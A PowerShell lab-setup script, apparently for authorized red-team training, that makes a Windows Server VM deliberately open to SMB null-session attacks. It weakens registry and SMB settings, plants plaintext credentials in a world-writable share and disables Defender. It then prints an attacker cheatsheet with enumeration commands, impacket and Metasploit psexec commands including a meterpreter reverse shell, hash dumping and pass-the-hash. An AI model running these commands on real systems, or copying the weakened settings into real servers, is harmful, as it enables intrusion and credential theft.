#Requires -RunAsAdministrator
<#
.SYNOPSIS
    SMB Null Session Attack Scenario - Vulnerable Lab Setup Script
    Target OS : Windows Server 2016 (works on 2019 too)
    Author    : PwC India - Cybersecurity Practice
    Purpose   : Authorized security training / red team lab replication

.DESCRIPTION
    Configures a Windows Server 2016 VM to be vulnerable to the following
    attack chain (pure SMB abuse, no patch dependency, no domain required):

        Null Session Enumeration
              |
              v
        Anonymous Share Access  (BackupShare - Everyone:FULL)
              |
              v
        Credential Harvesting   (plaintext creds in share files)
              |
              v
        PSExec over SMB         (NT AUTHORITY\SYSTEM)

    Every configuration change is logged and reversible via Restore-SMBLabDefaults.ps1
    which is auto-generated in the same directory.

.NOTES
    Run from an elevated PowerShell prompt on the target VM.
    This script is INTENTIONALLY INSECURE. Only use in isolated lab environments.
#>

# ─────────────────────────────────────────────────────────────────────────────
# CONFIGURATION BLOCK — edit these before running
# ─────────────────────────────────────────────────────────────────────────────
$Config = @{
    # Service account that will be the "target" credential in share files
    TargetUser        = "admin_svc"
    TargetPassword    = "Password123!"

    # Second user for realism
    BackupUser        = "backup_svc"
    BackupPassword    = "Backup@2023"

    # Share details
    ShareName         = "BackupShare"
    SharePath         = "C:\BackupShare"

    # Script output directory
    OutputDir         = "C:\LabSetup"

    # Log file
    LogFile           = "C:\LabSetup\setup_log.txt"
}

# ─────────────────────────────────────────────────────────────────────────────
# HELPER FUNCTIONS
# ─────────────────────────────────────────────────────────────────────────────
function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$timestamp][$Level] $Message"
    Write-Host $line -ForegroundColor $(if ($Level -eq "ERROR") {"Red"} elseif ($Level -eq "WARN") {"Yellow"} elseif ($Level -eq "SUCCESS") {"Green"} else {"Cyan"})
    Add-Content -Path $Config.LogFile -Value $line -ErrorAction SilentlyContinue
}

function Test-AdminPrivilege {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal   = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Save-OriginalRegistryValue {
    param([string]$Path, [string]$Name, [string]$RestoreScript)
    try {
        $val = Get-ItemProperty -Path $Path -Name $Name -ErrorAction Stop
        $entry = "Set-ItemProperty -Path '$Path' -Name '$Name' -Value $($val.$Name) -Type DWORD"
        Add-Content -Path $RestoreScript -Value $entry
    } catch {
        # Key didn't exist — mark for deletion in restore
        $entry = "Remove-ItemProperty -Path '$Path' -Name '$Name' -ErrorAction SilentlyContinue"
        Add-Content -Path $RestoreScript -Value $entry
    }
}

# ─────────────────────────────────────────────────────────────────────────────
# PRE-FLIGHT CHECKS
# ─────────────────────────────────────────────────────────────────────────────
Clear-Host
Write-Host @"
╔══════════════════════════════════════════════════════════════════╗
║       SMB Null Session Lab — Vulnerable Environment Setup        ║
║       PwC India | Cybersecurity Practice | Training Use Only     ║
╚══════════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Red

Write-Host "`n[!] WARNING: This script makes this system INTENTIONALLY VULNERABLE." -ForegroundColor Yellow
Write-Host "[!] Run ONLY in an isolated lab VM. Never on production systems.`n" -ForegroundColor Yellow

$confirm = Read-Host "Type 'IUNDERSTAND' to proceed"
if ($confirm -ne "IUNDERSTAND") {
    Write-Host "Aborted." -ForegroundColor Red
    exit 1
}

if (-not (Test-AdminPrivilege)) {
    Write-Host "[ERROR] Must run as Administrator." -ForegroundColor Red
    exit 1
}

# Create output directory
New-Item -ItemType Directory -Path $Config.OutputDir -Force | Out-Null
New-Item -ItemType Directory -Path $Config.SharePath  -Force | Out-Null

# Initialize log
"" | Set-Content $Config.LogFile
Write-Log "=== SMB Lab Setup Started ==="
Write-Log "OS: $((Get-WmiObject Win32_OperatingSystem).Caption)"
Write-Log "Hostname: $env:COMPUTERNAME"
Write-Log "Date: $(Get-Date)"

# ─────────────────────────────────────────────────────────────────────────────
# STEP 0 — GENERATE RESTORE SCRIPT
# ─────────────────────────────────────────────────────────────────────────────
$RestoreScript = "$($Config.OutputDir)\Restore-SMBLabDefaults.ps1"
@"
#Requires -RunAsAdministrator
# AUTO-GENERATED RESTORE SCRIPT
# Run this to undo all changes made by Setup-SMBLabVulnerable.ps1
Write-Host 'Restoring original security configuration...' -ForegroundColor Green
"@ | Set-Content $RestoreScript

Write-Log "Restore script initialized at: $RestoreScript"

# ─────────────────────────────────────────────────────────────────────────────
# STEP 1 — CREATE LOCAL USER ACCOUNTS
# ─────────────────────────────────────────────────────────────────────────────
Write-Log "--- STEP 1: Creating local user accounts ---"

$usersToCreate = @(
    @{ Name = $Config.TargetUser;  Password = $Config.TargetPassword;  Admin = $true  },
    @{ Name = $Config.BackupUser;  Password = $Config.BackupPassword;  Admin = $false }
)

foreach ($u in $usersToCreate) {
    try {
        $existing = Get-LocalUser -Name $u.Name -ErrorAction SilentlyContinue
        if ($existing) {
            Write-Log "User '$($u.Name)' already exists — resetting password" "WARN"
            Set-LocalUser -Name $u.Name -Password (ConvertTo-SecureString $u.Password -AsPlainText -Force)
        } else {
            New-LocalUser -Name $u.Name `
                          -Password (ConvertTo-SecureString $u.Password -AsPlainText -Force) `
                          -FullName "$($u.Name) Service Account" `
                          -Description "Lab service account - intentionally weak" `
                          -PasswordNeverExpires `
                          -UserMayNotChangePassword | Out-Null
            Write-Log "Created user: $($u.Name)" "SUCCESS"
        }

        # Add to local admins if required
        if ($u.Admin) {
            $members = Get-LocalGroupMember -Group "Administrators" -ErrorAction SilentlyContinue
            if ($members.Name -notcontains "$env:COMPUTERNAME\$($u.Name)") {
                Add-LocalGroupMember -Group "Administrators" -Member $u.Name
                Write-Log "Added '$($u.Name)' to local Administrators group" "SUCCESS"
            } else {
                Write-Log "'$($u.Name)' already in Administrators group" "WARN"
            }
        }

        # Mark for cleanup in restore script
        Add-Content -Path $RestoreScript -Value "Remove-LocalUser -Name '$($u.Name)' -ErrorAction SilentlyContinue"

    } catch {
        Write-Log "Failed to create user $($u.Name): $_" "ERROR"
    }
}

# Enable built-in Administrator account
try {
    Enable-LocalUser -Name "Administrator"
    Write-Log "Built-in Administrator account enabled" "SUCCESS"
    Add-Content -Path $RestoreScript -Value "Disable-LocalUser -Name 'Administrator'"
} catch {
    Write-Log "Could not enable Administrator: $_" "WARN"
}

# ─────────────────────────────────────────────────────────────────────────────
# STEP 2 — REGISTRY: NULL SESSION CONFIGURATION
# ─────────────────────────────────────────────────────────────────────────────
Write-Log "--- STEP 2: Configuring null session registry keys ---"

$LSAPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
$LanManPath = "HKLM:\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters"

# Save originals for restore
Save-OriginalRegistryValue -Path $LSAPath    -Name "RestrictAnonymous"    -RestoreScript $RestoreScript
Save-OriginalRegistryValue -Path $LSAPath    -Name "RestrictAnonymousSAM" -RestoreScript $RestoreScript
Save-OriginalRegistryValue -Path $LanManPath -Name "NullSessionShares"    -RestoreScript $RestoreScript
Save-OriginalRegistryValue -Path $LanManPath -Name "NullSessionPipes"     -RestoreScript $RestoreScript

# Apply vulnerable settings
try {
    # RestrictAnonymous = 0 → allows null session enumeration of shares, users, policies
    Set-ItemProperty -Path $LSAPath -Name "RestrictAnonymous"    -Value 0 -Type DWord
    Write-Log "Set RestrictAnonymous = 0 (null session enumeration enabled)" "SUCCESS"

    # RestrictAnonymousSAM = 0 → allows anonymous enumeration of SAM accounts
    Set-ItemProperty -Path $LSAPath -Name "RestrictAnonymousSAM" -Value 0 -Type DWord
    Write-Log "Set RestrictAnonymousSAM = 0 (anonymous SAM enumeration enabled)" "SUCCESS"

    # Allow IPC$ null session
    Set-ItemProperty -Path $LanManPath -Name "NullSessionShares" -Value "IPC$" -Type MultiString
    Write-Log "Set NullSessionShares = IPC$" "SUCCESS"

    # Allow named pipe access for RPC (needed for rpcclient enumeration)
    Set-ItemProperty -Path $LanManPath -Name "NullSessionPipes" -Value @("samr","lsarpc","netlogon","srvsvc","wkssvc") -Type MultiString
    Write-Log "Set NullSessionPipes (samr, lsarpc, netlogon, srvsvc, wkssvc)" "SUCCESS"

} catch {
    Write-Log "Registry configuration failed: $_" "ERROR"
}

# ─────────────────────────────────────────────────────────────────────────────
# STEP 3 — REGISTRY: LOCAL ACCOUNT TOKEN FILTER POLICY
# ─────────────────────────────────────────────────────────────────────────────
Write-Log "--- STEP 3: Configuring LocalAccountTokenFilterPolicy ---"

$PoliciesPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"

Save-OriginalRegistryValue -Path $PoliciesPath -Name "LocalAccountTokenFilterPolicy" -RestoreScript $RestoreScript

try {
    # Set to 1 → allows local admin accounts to authenticate over network with full token
    # This is what makes PSExec work with local admin accounts (not just domain admins)
    Set-ItemProperty -Path $PoliciesPath -Name "LocalAccountTokenFilterPolicy" -Value 1 -Type DWord
    Write-Log "Set LocalAccountTokenFilterPolicy = 1 (PSExec with local admin enabled)" "SUCCESS"
} catch {
    Write-Log "Failed to set LocalAccountTokenFilterPolicy: $_" "ERROR"
}

# ─────────────────────────────────────────────────────────────────────────────
# STEP 4 — SMB SERVICE CONFIGURATION
# ─────────────────────────────────────────────────────────────────────────────
Write-Log "--- STEP 4: Configuring SMB server settings ---"

try {
    # Ensure SMB1 and SMB2 are both running
    Set-SmbServerConfiguration -EnableSMB1Protocol $true  -Force -ErrorAction SilentlyContinue
    Set-SmbServerConfiguration -EnableSMB2Protocol $true  -Force -ErrorAction SilentlyContinue

    # Disable SMB signing requirement (signing enabled but NOT required — default for member servers)
    Set-SmbServerConfiguration -RequireSecuritySignature $false -Force
    Set-SmbServerConfiguration -EnableSecuritySignature  $true  -Force
    Write-Log "SMB signing: enabled but NOT required (relay-vulnerable)" "SUCCESS"

    # Disable encrypted transport (required for null session to work cleanly)
    Set-SmbServerConfiguration -EncryptData $false -Force
    Write-Log "SMB encryption disabled" "SUCCESS"

    Add-Content -Path $RestoreScript -Value "Set-SmbServerConfiguration -RequireSecuritySignature `$true -Force"
    Add-Content -Path $RestoreScript -Value "Set-SmbServerConfiguration -EnableSMB1Protocol `$false -Force"

} catch {
    Write-Log "SMB configuration error: $_" "WARN"
}

# ─────────────────────────────────────────────────────────────────────────────
# STEP 5 — CREATE AND CONFIGURE VULNERABLE SHARE
# ─────────────────────────────────────────────────────────────────────────────
Write-Log "--- STEP 5: Creating misconfigured BackupShare ---"

try {
    # Remove existing share if present
    $existingShare = Get-SmbShare -Name $Config.ShareName -ErrorAction SilentlyContinue
    if ($existingShare) {
        Remove-SmbShare -Name $Config.ShareName -Force
        Write-Log "Removed existing share: $($Config.ShareName)" "WARN"
    }

    # Create the share
    New-SmbShare -Name $Config.ShareName `
                 -Path $Config.SharePath `
                 -Description "Backup Configuration Files" `
                 -FullAccess "Everyone" `
                 -ErrorAction Stop | Out-Null
    Write-Log "Created SMB share: \\$env:COMPUTERNAME\$($Config.ShareName) (Everyone:FULL)" "SUCCESS"

    # Also set NTFS ACLs to match (Everyone - Full Control)
    $acl = Get-Acl $Config.SharePath
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
        "Everyone",
        "FullControl",
        "ContainerInherit,ObjectInherit",
        "None",
        "Allow"
    )
    $acl.AddAccessRule($rule)
    Set-Acl -Path $Config.SharePath -AclObject $acl
    Write-Log "NTFS ACL set: Everyone - Full Control on $($Config.SharePath)" "SUCCESS"

    Add-Content -Path $RestoreScript -Value "Remove-SmbShare -Name '$($Config.ShareName)' -Force -ErrorAction SilentlyContinue"
    Add-Content -Path $RestoreScript -Value "Remove-Item -Path '$($Config.SharePath)' -Recurse -Force -ErrorAction SilentlyContinue"

} catch {
    Write-Log "Share creation failed: $_" "ERROR"
}

# ─────────────────────────────────────────────────────────────────────────────
# STEP 6 — DROP CREDENTIAL FILES IN SHARE (the bait)
# ─────────────────────────────────────────────────────────────────────────────
Write-Log "--- STEP 6: Planting credential files in share ---"

# File 1: Database configuration file with plaintext credentials
$dbConfigContent = @"
; ============================================================
; Database Connection Configuration
; Generated by: IT Operations Team
; Last Updated: $(Get-Date -Format 'yyyy-MM-dd')
; ============================================================

[Database]
host     = $env:COMPUTERNAME
port     = 1433
database = BankingCoreDB

[Credentials]
username = $($Config.TargetUser)
password = $($Config.TargetPassword)
domain   =

[Backup]
backup_user = $($Config.BackupUser)
backup_pass = $($Config.BackupPassword)
backup_path = \\$env:COMPUTERNAME\BackupShare
"@

$dbConfigContent | Set-Content "$($Config.SharePath)\db_config.ini" -Encoding UTF8
Write-Log "Created: db_config.ini (contains plaintext DB credentials)" "SUCCESS"

# File 2: PowerShell backup script with hardcoded credentials (extremely common finding)
$psScriptContent = @"
# ============================================================
# Automated Backup Script - DO NOT DELETE
# Scheduled Task: Daily 02:00 AM
# Owner: IT Operations
# ============================================================

# Hardcoded credentials for backup service
`$username = "$($Config.TargetUser)"
`$password = "$($Config.TargetPassword)"
`$secPass  = ConvertTo-SecureString `$password -AsPlainText -Force
`$cred     = New-Object System.Management.Automation.PSCredential(`$username, `$secPass)

# Connect to backup share
`$session = New-PSSession -ComputerName $env:COMPUTERNAME -Credential `$cred

# Backup database files
Invoke-Command -Session `$session -ScriptBlock {
    Copy-Item "C:\Database\*" "C:\BackupShare\" -Recurse -Force
}

# Cleanup
Remove-PSSession `$session
Write-EventLog -LogName Application -Source "BackupScript" -EventId 1000 -Message "Backup completed successfully"
"@

$psScriptContent | Set-Content "$($Config.SharePath)\backup_job.ps1" -Encoding UTF8
Write-Log "Created: backup_job.ps1 (contains hardcoded PSCredential)" "SUCCESS"

# File 3: Batch file with net use credentials (another classic finding)
$batContent = @"
@echo off
REM ============================================================
REM Network Drive Mapping Script
REM Run at startup via Group Policy
REM ============================================================

net use Z: \\$env:COMPUTERNAME\BackupShare /user:$($Config.TargetUser) $($Config.TargetPassword) /persistent:yes
net use Y: \\$env:COMPUTERNAME\C$ /user:$($Config.TargetUser) $($Config.TargetPassword)

echo Drives mapped successfully
"@

$batContent | Set-Content "$($Config.SharePath)\map_drives.bat" -Encoding ASCII
Write-Log "Created: map_drives.bat (contains net use with credentials)" "SUCCESS"

# File 4: XML config (simulates application config / web.config style)
$xmlContent = @"
<?xml version="1.0" encoding="utf-8"?>
<!-- Application Configuration File -->
<!-- Generated: $(Get-Date -Format 'yyyy-MM-dd') -->
<configuration>
  <appSettings>
    <add key="AppName" value="CoreBankingBackup" />
    <add key="Environment" value="Production" />
  </appSettings>
  <connectionStrings>
    <add name="DefaultConnection"
         connectionString="Server=$env:COMPUTERNAME;Database=BankingCoreDB;User Id=$($Config.TargetUser);Password=$($Config.TargetPassword);Integrated Security=False;"
         providerName="System.Data.SqlClient" />
  </connectionStrings>
  <serviceCredentials>
    <username>$($Config.TargetUser)</username>
    <password>$($Config.TargetPassword)</password>
    <domain>$env:COMPUTERNAME</domain>
  </serviceCredentials>
</configuration>
"@

$xmlContent | Set-Content "$($Config.SharePath)\app_config.xml" -Encoding UTF8
Write-Log "Created: app_config.xml (contains connection string with credentials)" "SUCCESS"

# File 5: Readme (adds realism)
$readmeContent = @"
BACKUP SHARE - IT OPERATIONS
=============================
This share contains automated backup scripts and configuration files.
Do not modify without approval from IT Operations team.

Contents:
- db_config.ini     : Database connection settings
- backup_job.ps1    : Automated backup PowerShell script
- map_drives.bat    : Network drive mapping script
- app_config.xml    : Application configuration

For issues contact: it-ops@company.local
"@

$readmeContent | Set-Content "$($Config.SharePath)\README.txt" -Encoding UTF8
Write-Log "Created: README.txt" "SUCCESS"

# ─────────────────────────────────────────────────────────────────────────────
# STEP 7 — WINDOWS FIREWALL CONFIGURATION
# ─────────────────────────────────────────────────────────────────────────────
Write-Log "--- STEP 7: Configuring Windows Firewall ---"

try {
    # Ensure SMB ports are explicitly open (445 and 139)
    $rules = @(
        @{ Name = "Lab-SMB-445"; Port = 445; Protocol = "TCP" },
        @{ Name = "Lab-NetBIOS-139"; Port = 139; Protocol = "TCP" },
        @{ Name = "Lab-RPC-135"; Port = 135; Protocol = "TCP" }
    )

    foreach ($rule in $rules) {
        $existing = Get-NetFirewallRule -DisplayName $rule.Name -ErrorAction SilentlyContinue
        if (-not $existing) {
            New-NetFirewallRule -DisplayName $rule.Name `
                                -Direction Inbound `
                                -Protocol $rule.Protocol `
                                -LocalPort $rule.Port `
                                -Action Allow `
                                -Profile Any | Out-Null
            Write-Log "Firewall rule created: $($rule.Name) (port $($rule.Port))" "SUCCESS"
            Add-Content -Path $RestoreScript -Value "Remove-NetFirewallRule -DisplayName '$($rule.Name)' -ErrorAction SilentlyContinue"
        }
    }

    # Option: fully disable firewall for lab simplicity
    # Uncomment the lines below if you want the firewall completely off:
    # netsh advfirewall set allprofiles state off
    # Write-Log "Windows Firewall DISABLED (lab mode)" "WARN"

} catch {
    Write-Log "Firewall configuration error: $_" "WARN"
}

# ─────────────────────────────────────────────────────────────────────────────
# STEP 8 — NETWORK SERVICES (ensure Server service, Workstation, RPC are running)
# ─────────────────────────────────────────────────────────────────────────────
Write-Log "--- STEP 8: Verifying required services ---"

$requiredServices = @(
    @{ Name = "LanmanServer";    DisplayName = "Server (SMB)"       },
    @{ Name = "LanmanWorkstation"; DisplayName = "Workstation"      },
    @{ Name = "RpcSs";           DisplayName = "RPC"                },
    @{ Name = "SamSs";           DisplayName = "Security Accounts Manager" },
    @{ Name = "lmhosts";         DisplayName = "TCP/IP NetBIOS Helper" }
)

foreach ($svc in $requiredServices) {
    try {
        $service = Get-Service -Name $svc.Name -ErrorAction Stop
        if ($service.Status -ne "Running") {
            Start-Service -Name $svc.Name -ErrorAction Stop
            Set-Service -Name $svc.Name -StartupType Automatic
            Write-Log "Started service: $($svc.DisplayName)" "SUCCESS"
        } else {
            Write-Log "Service already running: $($svc.DisplayName)" "INFO"
        }
    } catch {
        Write-Log "Service issue ($($svc.Name)): $_" "WARN"
    }
}

# ─────────────────────────────────────────────────────────────────────────────
# STEP 9 — DISABLE WINDOWS DEFENDER REAL-TIME (for PSExec payload execution)
# ─────────────────────────────────────────────────────────────────────────────
Write-Log "--- STEP 9: Configuring Windows Defender ---"

try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection     $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScriptScanning     $true -ErrorAction SilentlyContinue
    Set-MpPreference -SubmitSamplesConsent 2          -ErrorAction SilentlyContinue
    Write-Log "Windows Defender real-time protection disabled" "SUCCESS"

    Add-Content -Path $RestoreScript -Value "Set-MpPreference -DisableRealtimeMonitoring `$false"
    Add-Content -Path $RestoreScript -Value "Set-MpPreference -DisableIOAVProtection `$false"
    Add-Content -Path $RestoreScript -Value "Set-MpPreference -DisableScriptScanning `$false"
} catch {
    Write-Log "Could not configure Defender (may already be off): $_" "WARN"
}

# ─────────────────────────────────────────────────────────────────────────────
# STEP 10 — VERIFY COMPLETE SETUP
# ─────────────────────────────────────────────────────────────────────────────
Write-Log "--- STEP 10: Running verification checks ---"

$verificationPassed = $true

# Check 1: Users exist and admin_svc is local admin
$adminMembers = Get-LocalGroupMember -Group "Administrators" | Select-Object -ExpandProperty Name
if ($adminMembers -match $Config.TargetUser) {
    Write-Log "[VERIFY] $($Config.TargetUser) is local administrator: PASS" "SUCCESS"
} else {
    Write-Log "[VERIFY] $($Config.TargetUser) is local administrator: FAIL" "ERROR"
    $verificationPassed = $false
}

# Check 2: RestrictAnonymous = 0
$ra = (Get-ItemProperty -Path $LSAPath -Name "RestrictAnonymous").RestrictAnonymous
if ($ra -eq 0) {
    Write-Log "[VERIFY] RestrictAnonymous = 0: PASS" "SUCCESS"
} else {
    Write-Log "[VERIFY] RestrictAnonymous = $ra (expected 0): FAIL" "ERROR"
    $verificationPassed = $false
}

# Check 3: RestrictAnonymousSAM = 0
$raSAM = (Get-ItemProperty -Path $LSAPath -Name "RestrictAnonymousSAM").RestrictAnonymousSAM
if ($raSAM -eq 0) {
    Write-Log "[VERIFY] RestrictAnonymousSAM = 0: PASS" "SUCCESS"
} else {
    Write-Log "[VERIFY] RestrictAnonymousSAM = $raSAM (expected 0): FAIL" "ERROR"
    $verificationPassed = $false
}

# Check 4: LocalAccountTokenFilterPolicy = 1
$latfp = (Get-ItemProperty -Path $PoliciesPath -Name "LocalAccountTokenFilterPolicy" -ErrorAction SilentlyContinue).LocalAccountTokenFilterPolicy
if ($latfp -eq 1) {
    Write-Log "[VERIFY] LocalAccountTokenFilterPolicy = 1: PASS" "SUCCESS"
} else {
    Write-Log "[VERIFY] LocalAccountTokenFilterPolicy = $latfp (expected 1): FAIL" "ERROR"
    $verificationPassed = $false
}

# Check 5: BackupShare exists
$share = Get-SmbShare -Name $Config.ShareName -ErrorAction SilentlyContinue
if ($share) {
    Write-Log "[VERIFY] Share '$($Config.ShareName)' exists: PASS" "SUCCESS"
} else {
    Write-Log "[VERIFY] Share '$($Config.ShareName)' does not exist: FAIL" "ERROR"
    $verificationPassed = $false
}

# Check 6: Credential files exist
$files = @("db_config.ini","backup_job.ps1","map_drives.bat","app_config.xml")
foreach ($f in $files) {
    $path = "$($Config.SharePath)\$f"
    if (Test-Path $path) {
        Write-Log "[VERIFY] File $f exists in share: PASS" "SUCCESS"
    } else {
        Write-Log "[VERIFY] File $f MISSING: FAIL" "ERROR"
        $verificationPassed = $false
    }
}

# Check 7: SMB signing not required
$smbConfig = Get-SmbServerConfiguration
if (-not $smbConfig.RequireSecuritySignature) {
    Write-Log "[VERIFY] SMB signing NOT required: PASS" "SUCCESS"
} else {
    Write-Log "[VERIFY] SMB signing required (blocks relay): FAIL" "ERROR"
}

# Check 8: Server service running
$serverSvc = Get-Service -Name LanmanServer
if ($serverSvc.Status -eq "Running") {
    Write-Log "[VERIFY] Server (SMB) service running: PASS" "SUCCESS"
} else {
    Write-Log "[VERIFY] Server service not running: FAIL" "ERROR"
    $verificationPassed = $false
}

# ─────────────────────────────────────────────────────────────────────────────
# STEP 11 — GENERATE ATTACKER CHEATSHEET
# ─────────────────────────────────────────────────────────────────────────────
$targetIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" } | Select-Object -First 1).IPAddress

$cheatsheet = @"
╔══════════════════════════════════════════════════════════════════════╗
║         SMB NULL SESSION ATTACK — ATTACKER CHEATSHEET               ║
║         Target: $targetIP ($env:COMPUTERNAME)
╚══════════════════════════════════════════════════════════════════════╝

TARGET IP    : $targetIP
TARGET HOST  : $env:COMPUTERNAME
SMB PORT     : 445 (also 139)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PHASE 1 — RECONNAISSANCE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Port scan
nmap -sV -p 139,445 $targetIP

# SMB signing check
nmap --script smb2-security-mode -p 445 $targetIP

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PHASE 2 — NULL SESSION ENUMERATION (no credentials)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# List shares anonymously
smbclient -L //$targetIP -N

# Enumerate users, groups, shares, password policy
enum4linux -a $targetIP

# CrackMapExec null session
crackmapexec smb $targetIP -u '' -p '' --shares
crackmapexec smb $targetIP -u '' -p '' --users
crackmapexec smb $targetIP -u '' -p '' --pass-pol

# rpcclient null session
rpcclient -U "" -N $targetIP
  >> enumdomusers
  >> queryuser 0x3e8
  >> enumalsgroups builtin
  >> queryaliasmem builtin 0x220

# smbmap null session
smbmap -H $targetIP -u '' -p ''

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PHASE 3 — ANONYMOUS SHARE ACCESS & CREDENTIAL HARVEST
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Connect to BackupShare anonymously
smbclient //$targetIP/$($Config.ShareName) -N

  smb: \> ls
  smb: \> get db_config.ini
  smb: \> get backup_job.ps1
  smb: \> get map_drives.bat
  smb: \> get app_config.xml

# Spider share for all files
crackmapexec smb $targetIP -u '' -p '' -M spider_plus
crackmapexec smb $targetIP -u '' -p '' --spider $($Config.ShareName) --pattern '*.ini,*.ps1,*.bat,*.xml'

# Read creds from files — FOUND:
#   $($Config.TargetUser) : $($Config.TargetPassword)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PHASE 4 — VALIDATE CREDENTIALS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

crackmapexec smb $targetIP -u $($Config.TargetUser) -p '$($Config.TargetPassword)'
# Expected: [+] $env:COMPUTERNAME\$($Config.TargetUser):$($Config.TargetPassword) (Pwn3d!)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PHASE 5 — RCE VIA PSEXEC OVER SMB
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Option A — Impacket psexec (drops PSEXESVC binary via SMB)
impacket-psexec '$($Config.TargetUser):$($Config.TargetPassword)@$targetIP'

# Option B — Impacket smbexec (no binary drop, uses service + cmd.exe)
impacket-smbexec '$($Config.TargetUser):$($Config.TargetPassword)@$targetIP'

# Option C — Impacket wmiexec (SMB auth + WMI exec, stealthiest)
impacket-wmiexec '$($Config.TargetUser):$($Config.TargetPassword)@$targetIP'

# Option D — Metasploit psexec
msfconsole -q -x "
  use exploit/windows/smb/psexec;
  set RHOSTS $targetIP;
  set SMBUser $($Config.TargetUser);
  set SMBPass $($Config.TargetPassword);
  set PAYLOAD windows/x64/meterpreter/reverse_tcp;
  set LHOST <YOUR_KALI_IP>;
  set LPORT 4444;
  run"

# Option E — CrackMapExec direct command execution
crackmapexec smb $targetIP -u $($Config.TargetUser) -p '$($Config.TargetPassword)' -x 'whoami'
crackmapexec smb $targetIP -u $($Config.TargetUser) -p '$($Config.TargetPassword)' -x 'net localgroup administrators'

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PHASE 6 — POST EXPLOITATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# In meterpreter:
meterpreter > getuid               # NT AUTHORITY\SYSTEM
meterpreter > hashdump             # Dump local hashes
meterpreter > load kiwi
meterpreter > lsa_dump_sam         # Full SAM dump

# Pass the hash to pivot
crackmapexec smb <SUBNET>/24 -u administrator -H <NTHASH> --local-auth --continue-on-success

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
TO RESTORE DEFAULTS AFTER LAB:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  powershell -ExecutionPolicy Bypass -File "$RestoreScript"

"@

$cheatsheet | Set-Content "$($Config.OutputDir)\ATTACKER_CHEATSHEET.txt" -Encoding UTF8
Write-Log "Attacker cheatsheet saved: $($Config.OutputDir)\ATTACKER_CHEATSHEET.txt" "SUCCESS"

# ─────────────────────────────────────────────────────────────────────────────
# FINAL OUTPUT
# ─────────────────────────────────────────────────────────────────────────────

Write-Host "`n"
Write-Host "═══════════════════════════════════════════════════════════════" -ForegroundColor Cyan
if ($verificationPassed) {
    Write-Host "  LAB SETUP COMPLETE — ALL CHECKS PASSED" -ForegroundColor Green
} else {
    Write-Host "  LAB SETUP COMPLETE — SOME CHECKS FAILED (review log)" -ForegroundColor Yellow
}
Write-Host "═══════════════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host ""
Write-Host "  Target IP     : $targetIP" -ForegroundColor White
Write-Host "  Target Host   : $env:COMPUTERNAME" -ForegroundColor White
Write-Host "  SMB Share     : \\$targetIP\$($Config.ShareName)" -ForegroundColor White
Write-Host "  Creds in files: $($Config.TargetUser) / $($Config.TargetPassword)" -ForegroundColor White
Write-Host ""
Write-Host "  Files created:"
Write-Host "    $($Config.OutputDir)\setup_log.txt" -ForegroundColor Gray
Write-Host "    $($Config.OutputDir)\ATTACKER_CHEATSHEET.txt" -ForegroundColor Gray
Write-Host "    $RestoreScript" -ForegroundColor Gray
Write-Host ""
Write-Host "  [!] No reboot required — all changes are active immediately" -ForegroundColor Yellow
Write-Host "  [!] Restore defaults after lab: .\Restore-SMBLabDefaults.ps1" -ForegroundColor Yellow
Write-Host ""

# Print cheatsheet to console too
Write-Host $cheatsheet -ForegroundColor DarkCyan

Write-Log "=== Setup completed. Verification passed: $verificationPassed ==="
